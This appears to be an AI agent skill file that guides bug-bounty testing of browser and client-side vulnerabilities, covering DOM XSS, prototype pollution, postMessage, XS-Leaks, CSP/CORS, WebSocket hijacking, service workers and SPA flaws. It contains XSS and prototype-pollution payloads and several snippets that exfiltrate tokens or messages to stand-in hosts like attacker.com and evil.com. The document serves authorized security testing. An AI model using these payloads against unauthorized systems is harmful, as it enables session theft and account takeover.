---
name: client-side-security
description: Browser and client-side vulnerability testing — DOM-based XSS, prototype pollution, postMessage flaws, XS-Leaks, CSP/CORS bypasses, WebSocket hijacking, service worker attacks, client-side storage leaks, and SPA-specific issues. Use when testing frontend JavaScript, browser security boundaries, or single-page applications. Trigger on "DOM XSS", "prototype pollution", "postMessage", "XS-Leak", "CSP bypass", "CORS bypass", "WebSocket security", "service worker", "client-side", "browser security", "SPA security", "frontend security", "DOM clobbering", "cross-site leak", "client-side routing", "localStorage", "sessionStorage", "source map".
---

# Client-Side & Browser Security Testing

Client-side vulnerabilities are consistently undervalued by automated scanners yet pay well in bug bounties. Most modern applications are JavaScript-heavy SPAs where the real attack surface lives in the browser — DOM manipulation, message passing, storage APIs, and client-side routing.

### Key CVEs & Real-World Examples

| CVE | Product | Type | Impact |
|-----|---------|------|--------|
| CVE-2026-2441 | Chrome | CSS @property + paint() worklet UAF | Actively exploited zero-day (patched Feb 13, 2026) |
| CVE-2026-3545 | Chrome | Navigation data validation | Sandbox escape (CVSS 9.6) |
| CVE-2026-0628 | Chrome Gemini | Extension → privileged WebView injection | Low-priv extension hijacks Gemini panel: camera, mic, screenshots, files (CVSS 8.8) |
| CVE-2025-43714 | ChatGPT | SVG-based XSS | Arbitrary HTML/JS in AI preview window |
| CVE-2026-29183 | SiYuan | Reflected XSS | Unauthenticated session token theft (CVSS 9.3) |
| CVE-2025-55182 | React (RSC) | React2Shell deser-to-RCE | Pre-auth RCE in Server Components (CVSS 10.0) |
| CVE-2024-38472 | Apache HTTP Server | SSRF via encoded `?` | Origin confusion with mod_rewrite |
| CVE-2023-49103 | ownCloud | DOM-based info disclosure | GraphQL endpoint leaking credentials |

### Framework-Specific Dangerous Patterns

| Framework | Dangerous Pattern | Test Vector |
|-----------|------------------|-------------|
| React | `dangerouslySetInnerHTML={{__html: userInput}}` | `<img src=x onerror=alert(1)>` |
| Vue | `v-html="userInput"` | Same as above — Vue v-html renders raw HTML |
| Angular | `bypassSecurityTrustHtml(userInput)` | Any HTML payload — Angular sanitizer explicitly bypassed |
| Next.js | SSR/CSR hydration mismatch | Content rendered server-side differs from client — inject in SSR |
| Svelte | `{@html userInput}` | Raw HTML rendering, same risk as v-html |

## Quick Reference: What Pays

| Bug Class | Typical Severity | Avg Payout Range | Duplicate Risk |
|-----------|-----------------|------------------|----------------|
| DOM-based XSS (stored context) | High–Critical | $2k–$20k | Medium |
| Prototype pollution → XSS/bypass | Medium–High | $1k–$10k | Low |
| PostMessage → account takeover | High–Critical | $3k–$15k | Low |
| XS-Leaks (user deanon) | Medium–High | $1k–$8k | Low |
| CSP bypass → XSS escalation | Medium–High | $500–$5k | Medium |
| CORS misconfiguration | Medium–Critical | $1k–$10k | High |
| WebSocket hijacking (CSWSH) | High | $2k–$10k | Low |
| Service worker cache poison | Medium–High | $1k–$8k | Low |
| Client-side storage token leak | Medium–High | $500–$5k | Medium |
| SPA auth bypass (client route) | Medium–High | $1k–$8k | Low–Medium |

---

## 1. DOM-Based XSS

Execution happens entirely in the browser — the malicious payload never reaches the server. Scanners miss most DOM XSS because they don't execute JavaScript.

### Sources and Sinks

| Sources (attacker-controlled input) | Sinks (dangerous execution) |
|--------------------------------------|-----------------------------|
| `location.hash`, `location.search` | `innerHTML`, `outerHTML` |
| `document.URL`, `document.referrer` | `document.write()`, `document.writeln()` |
| `window.name` | `eval()`, `Function()`, `setTimeout(string)` |
| `postMessage` data | `$.html()`, `v-html`, `dangerouslySetInnerHTML` |
| `localStorage`/`sessionStorage` values | `element.insertAdjacentHTML()` |
| URL fragment identifiers | `location.href`, `location.assign()` (open redirect → XSS) |

### Testing Procedure

1. **Map sources** — Search JS bundles for `location.hash`, `location.search`, `URLSearchParams`, `document.URL`, `window.name`, `postMessage` handlers
2. **Trace data flow** — Follow each source through transformations to a sink. Check if sanitization exists and whether it can be bypassed
3. **Test payloads per sink type**:
   - innerHTML sink: `<img src=x onerror=alert(1)>`
   - eval sink: `'-alert(1)-'` or `\');alert(1)//`
   - location sink: `javascript:alert(1)` (if `href` assignment)
   - jQuery sink: `$('#el').html(userInput)` — test with HTML entities
4. **Check framework-specific sinks** — React `dangerouslySetInnerHTML`, Angular `bypassSecurityTrustHtml`, Vue `v-html`

### DOM Clobbering

HTML elements can shadow global JS variables via `id` or `name` attributes. If the app checks `if (window.config)` before using a CDN-hosted script, injecting `<img id=config>` clobbers that check.

```
Test: Inject <a id=x><a id=x name=y href="javascript:alert(1)">
If app accesses x.y, it follows the href → XSS
```

**Key indicators**: Code using `window.someVar` or bare global lookups without `let`/`const` declarations.

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-79 | Medium–Critical | Depends on context: stored DOM XSS is Critical; reflected with user interaction is Medium |

---

## 2. Prototype Pollution (Client-Side)

Attacker injects properties into `Object.prototype`, affecting all objects in the runtime. Client-side PP typically arrives via URL parameters or JSON parsing.

### Entry Points

```
# URL parameter pollution
https://target.com/page?__proto__[polluted]=1
https://target.com/page?constructor[prototype][polluted]=1
https://target.com/page#__proto__[isAdmin]=true

# JSON merge operations
{"__proto__": {"polluted": "1"}}
{"constructor": {"prototype": {"polluted": "1"}}}
```

### Testing Procedure

1. **Inject canary** — Append `?__proto__[testprop]=testval` to URL. Open DevTools console and check `({}).testprop === "testval"`
2. **Check alternate paths** — Try `constructor.prototype`, hash fragment, JSON body params
3. **Find gadgets** — Search JS for property lookups that fall through to prototype:
   - `obj[key]` where key is not validated
   - `if (options.transport_url)` — pollute `transport_url` to control script loading
   - `element.innerHTML = config.template` — pollute `template` for XSS
4. **Escalate PP to XSS** — Common gadgets:
   - `innerHTML` gadget: pollute a template property consumed by `.innerHTML`
   - `srcdoc` gadget: pollute attribute consumed in iframe creation
   - `data-*` gadget: pollute attributes read by jQuery or templating libraries
   - Script URL gadget: pollute `src` or `href` properties to inject `javascript:` URLs

### Known Gadget Libraries

| Library | Gadget | Polluted Property |
|---------|--------|-------------------|
| jQuery (< 3.4.0) | `$.extend()` | Deep merge without `__proto__` guard |
| Lodash (< 4.17.12) | `_.merge()`, `_.defaultsDeep()` | Recursive merge |
| Vue.js (< 2.6.12) | Template compiler | `staticClass`, `staticStyle` |
| sanitize-html | Bypass allowlist | `allowedTags`, `allowedAttributes` |
| Google Closure | `goog.object.merge` | Deep merge |

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-1321 | Medium–High | PP alone is Medium; PP→XSS or PP→auth bypass is High–Critical |

---

## 3. PostMessage Vulnerabilities

`window.postMessage` enables cross-origin communication but is frequently implemented without origin validation.

### Testing Procedure

1. **Find message handlers** — Search JS for `addEventListener("message"` or `window.onmessage`
2. **Check origin validation**:
   - Missing: `window.addEventListener("message", (e) => { processData(e.data) })` — no origin check at all
   - Weak: `if (e.origin.indexOf("target.com") > -1)` — bypassable with `attacker-target.com`
   - Regex flaw: `if (e.origin.match(/target\.com/))` — matches `target.com.evil.com`
3. **Test from attacker page** — Create an HTML page that opens/iframes the target and sends messages:
   ```html
   <iframe src="https://target.com/page" id="f"></iframe>
   <script>
   f.contentWindow.postMessage('{"action":"getToken"}', '*');
   window.onmessage = (e) => { fetch('https://attacker.com/log?d='+e.data); };
   </script>
   ```
4. **Check for data leaks** — Does the target respond with auth tokens, PII, or session data to any origin?
5. **Test message handler injection** — If handler calls `eval(e.data)` or sets `innerHTML = e.data.html`, inject payloads

### Common Patterns

| Pattern | Risk | Impact |
|---------|------|--------|
| No origin check + token in response | Critical | Full account takeover from any origin |
| Weak regex origin check | High | Bypass via subdomain or lookalike domain |
| Handler calls `eval()` on message data | Critical | RCE in browser context |
| Handler sets `location.href` from message | Medium | Open redirect → phishing |

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-346 | Medium–Critical | Origin validation bypass; Critical when token/session is leaked |

---

## 4. Cross-Site Leaks (XS-Leaks)

Side-channel techniques that infer cross-origin state without directly reading the response. Useful for user deanonymization, login detection, and content oracle attacks.

### Techniques

| Technique | What It Leaks | How |
|-----------|--------------|-----|
| **Frame counting** | Page state differences | `window.open(url).frames.length` differs based on auth state |
| **Timing attacks** | Content size/complexity | Measure `fetch()` or `<img>` load time; authenticated pages load differently |
| **Error events** | Resource existence | `<script src="target/api">` fires `onerror` vs `onload` based on response type |
| **Cache probing** | Prior visits/auth state | Load resource, measure timing; cached = previously visited |
| **History length** | Navigation state | `history.length` changes if redirect occurred (login vs. not) |
| **Content-Type oracle** | Response type | `<script>` tag errors reveal if response is JSON vs HTML |
| **ETag length leak** | Response body size | Cross-origin ETag value changes at hex digit boundaries (e.g., 0xFF→0x100) — byte-level size inference without reading response. PortSwigger Top 10 2025 #6 |
| **Connection pool exhaustion** | Cross-origin redirect target | Chrome prioritizes in-flight requests sharing a connection pool — measure `fetch()` timing to detect whether cross-origin redirect went to site A vs B. PortSwigger Top 10 2025 #8 |

### Testing Procedure

1. **Identify state-dependent endpoints** — Pages that behave differently for logged-in vs. logged-out users, or for user A vs. user B
2. **Test frame counting** — Open target in popup, check `popup.frames.length` from attacker page. Different values = information leak
3. **Test timing side-channels** — Measure request duration for search endpoints: `?q=known_user` vs `?q=nonexistent` — timing difference reveals user existence
4. **Test error-based oracles** — Load cross-origin resources as `<script>`, `<img>`, `<link>`. Error/success differences leak state
5. **Check SameSite cookie policy** — If cookies are `SameSite=None`, most XS-Leak techniques work. `SameSite=Lax` blocks many but not top-level navigation-based leaks

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-203 | Medium–High | User deanonymization is Medium; account existence oracle enabling targeted attack is High |

---

## 5. CSP and CORS Bypasses

Security headers that are frequently misconfigured, creating escalation paths for otherwise-blocked XSS or data exfiltration.

### CSP Bypass Patterns

| Misconfiguration | Bypass | Test |
|-----------------|--------|------|
| `unsafe-inline` | Direct `<script>` injection | Any reflected/stored XSS works without bypass |
| `unsafe-eval` | `eval()`, `Function()`, `setTimeout('string')` | Inject eval-based payloads |
| Missing `base-uri` | `<base href="https://evil.com/">` hijacks relative URLs | Inject base tag, check if scripts load from attacker origin |
| JSONP endpoint in allowlist | `<script src="allowed-cdn.com/jsonp?cb=alert">` | Find JSONP callbacks on CSP-allowed domains |
| `*.alloweddomain.com` | Upload script to subdomain, or find open redirect on allowed domain | Check for user-uploadable subdomains |
| `data:` in script-src | `<script src="data:text/javascript,alert(1)">` | Direct data URI script injection |
| Missing `object-src` | `<object data="data:text/html,<script>alert(1)</script>">` | Inject object/embed tags |
| Nonce leak via CSS injection | Exfiltrate nonce with `input[nonce^=a]` CSS selectors | Test if nonce is in DOM and CSS injection exists |

### CORS Misconfigurations

| Pattern | Test | Impact |
|---------|------|--------|
| Reflected `Origin` | Send `Origin: https://evil.com`, check `Access-Control-Allow-Origin: https://evil.com` | Full cross-origin data read |
| `null` origin allowed | Sandboxed iframe sends `Origin: null` | Data exfil from sandboxed context |
| Subdomain wildcard trust | `Origin: https://attacker.subdomain.target.com` | Compromised subdomain → main app data |
| Pre-flight bypass | Simple GET with `Content-Type: text/plain` bypasses preflight | State-changing GET requests exploitable |
| Credentials with wildcard | `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` | Browser blocks this, but check for server misconfiguration returning both |

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-942 (CORS), CWE-1385 (CSP) | Medium–High | CORS with credentials → High; CSP bypass escalates existing XSS |

---

## 6. WebSocket Security

WebSockets maintain persistent bidirectional connections and often skip standard browser security controls.

### Cross-Site WebSocket Hijacking (CSWSH)

WebSocket handshakes are regular HTTP upgrades — browsers attach cookies automatically. If the server doesn't validate `Origin`, an attacker page can hijack the connection.

### Testing Procedure

1. **Check handshake** — Inspect the `Upgrade` request. Does the server validate the `Origin` header? Send `Origin: https://evil.com` in the handshake
2. **Check auth mechanism** — Is auth via cookies only (vulnerable to CSWSH), or does it require a token in the first WS message?
3. **Test CSWSH** — From attacker page:
   ```javascript
   var ws = new WebSocket('wss://target.com/ws');
   ws.onmessage = (e) => fetch('https://attacker.com/log?d='+e.data);
   ```
   If the connection succeeds with the victim's session, CSWSH is confirmed
4. **Check for sensitive data in URL** — `wss://target.com/ws?token=SECRET` leaks token in logs, Referer headers
5. **Test message injection** — Send unexpected message types. Does the server validate message structure/commands?

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-1385, CWE-346 | High | CSWSH leading to data exfil or actions-on-behalf is High–Critical |

---

## 7. Service Worker Attacks

Service workers intercept all network requests within their scope. A registered malicious SW persists across page reloads and can poison responses indefinitely.

### Testing Procedure

1. **Find SW registration points** — Search JS for `navigator.serviceWorker.register()`. Note the `scope` parameter
2. **Check scope restrictions** — SW scope is limited to its directory path. A SW at `/static/sw.js` can only control `/static/*` unless `Service-Worker-Allowed` header broadens it
3. **Test SW registration via injection** — If you can inject HTML/JS at a path, try registering an attacker-controlled SW:
   ```javascript
   navigator.serviceWorker.register('/user-upload/evil-sw.js', {scope: '/'})
   ```
4. **Cache poisoning via SW** — If a legitimate SW caches responses without integrity checks, poison the cache by MITM during install phase or via server-side cache poisoning
5. **Check for SW update bypass** — SWs update when the byte content changes. If the SW URL is cacheable by a CDN, stale cached SW prevents security updates

### Key Indicators

- User-uploadable paths that share origin with the main app
- SW scope broader than necessary (`/` scope for a SW that only needs `/app/`)
- Missing `Service-Worker-Allowed` restrictions
- SW caching API responses containing auth tokens

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-349 | Medium–High | Persistent interception of all requests in scope; session hijacking if tokens are cached |

---

## 8. Client-Side Storage

Browsers offer multiple storage mechanisms, all readable by any JavaScript on the same origin. XSS on the origin means full storage compromise.

### What to Look For

| Storage | Risk Indicators | Test |
|---------|----------------|------|
| `localStorage` | Auth tokens, API keys, PII stored | `Object.keys(localStorage)` in console; check for JWTs, session IDs |
| `sessionStorage` | Same risks but tab-scoped | Check for tokens moved from URL params to sessionStorage |
| `IndexedDB` | Large data stores with sensitive records | `indexedDB.databases()` then inspect each DB for PII/tokens |
| Cookies | Missing `Secure`, `HttpOnly`, `SameSite` flags | Inspect cookie headers; `document.cookie` shows non-HttpOnly cookies |
| `document.cookie` | Token accessible to JS (no HttpOnly) | Any XSS can steal the session |

### Testing Procedure

1. **Enumerate stored data** — In DevTools Application tab, inspect all storage types for tokens, PII, and secrets
2. **Check token lifecycle** — Is the token cleared on logout? Does it persist after password change?
3. **Test cross-tab leakage** — `localStorage` is shared across all tabs of the same origin; `sessionStorage` is per-tab
4. **Check cookie flags** — Missing `HttpOnly` on session cookies = XSS → session hijacking; missing `Secure` = MITM theft; missing `SameSite` = CSRF
5. **Test storage-based XSS** — If stored values are rendered in the DOM, pollute storage and reload: `localStorage.setItem('username', '<img src=x onerror=alert(1)>')`

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-922, CWE-312 | Medium–High | Token in localStorage is Medium (requires XSS to exploit); missing cookie flags is Medium |

---

## 9. SPA-Specific Issues

Single-page applications implement routing, auth gates, and state management in client-side JavaScript — all of which an attacker can bypass.

### Client-Side Routing Auth Bypass

```
1. Identify protected routes: /admin, /dashboard, /settings
2. Check if auth is enforced server-side or only in the JS router
3. Direct navigation: browse to /admin — does the API return 401 or does the page render?
4. Modify router state: set isAuthenticated=true in state management (Redux/Vuex devtools)
5. API-level check: even if the page renders, do the underlying API calls require auth?
```

**Critical distinction**: Client-side route guards that hide UI but don't enforce server-side auth are cosmetic, not security controls. Report only when server-side checks are also missing.

### State Management Leaks

- **Redux/Vuex/MobX stores** often contain full user objects, tokens, and permissions in memory. Inspect `window.__REDUX_DEVTOOLS__` or `$vm.$store.state`
- **Hydration data** — SSR apps embed initial state as `<script>window.__INITIAL_STATE__=...</script>`. Check for leaked tokens, internal API URLs, or user data that shouldn't be in the HTML source
- **Source maps** — If `.map` files are exposed (`main.js.map`), the full original source code is recoverable. Test: append `.map` to any JS bundle URL. Look for API keys, internal endpoints, and auth logic in the decompiled source

### JWT in localStorage

If the app stores JWTs in `localStorage` instead of HttpOnly cookies:
- Any XSS steals the token: `fetch('https://evil.com/log?t='+localStorage.getItem('token'))`
- Token persists across sessions (no expiry enforcement by the browser)
- Not automatically cleared on logout if code doesn't explicitly `removeItem`

### Testing Checklist

```
[] Client-side route guards without server-side enforcement
[] Source maps exposed in production (append .map to JS URLs)
[] Initial hydration state contains tokens or secrets
[] Redux/Vuex devtools enabled in production
[] JWT stored in localStorage (XSS → full account takeover)
[] API keys embedded in JS bundles (search for 'api_key', 'apiKey', 'secret')
[] Debug/development routes left in production build (/debug, /test, /admin/dev)
[] Client-side input validation without server-side mirror
```

| CWE | Severity | Notes |
|-----|----------|-------|
| CWE-602 | Medium–High | Client-side auth bypass is Medium if only UI; High if server-side also missing. Source map exposure is Medium (information disclosure) |

---

## Methodology: Client-Side Testing Flow

```
1. Recon: Map JS bundles, identify framework (React/Angular/Vue/Svelte)
2. Storage: Inspect all client-side storage for tokens and secrets
3. Headers: Check CSP, CORS, cookie flags, X-Frame-Options
4. Message passing: Find postMessage handlers, check origin validation
5. DOM flow: Trace user-controlled inputs to dangerous sinks
6. Prototype pollution: Test URL params and JSON merge operations
7. WebSocket: Inspect WS handshakes for origin validation and auth
8. Service workers: Check registration scope and cache behavior
9. SPA-specific: Test route guards, hydration data, source maps
10. Escalation: Chain findings (PP→XSS, CSP bypass→stored XSS, CORS→token theft)
```

---

## Tools

| Tool | Use Case |
|------|----------|
| **DevTools Sources tab** | JS debugging, breakpoints on sinks, source map analysis |
| **DevTools Application tab** | Inspect storage, cookies, service workers, cache |
| **DOM Invader (Burp)** | Automated DOM XSS source/sink analysis, postMessage testing, prototype pollution |
| **Retire.js / Snyk** | Identify vulnerable JS library versions |
| **CSP Evaluator** (Google) | Analyze CSP header for weaknesses |
| **xsleaks.dev** | Reference wiki for XS-Leak techniques and browser-specific behaviors |
| **ppmap** | Automated prototype pollution scanner with gadget detection |
| **trufflehog / gitleaks** | Scan JS bundles for embedded secrets and API keys |
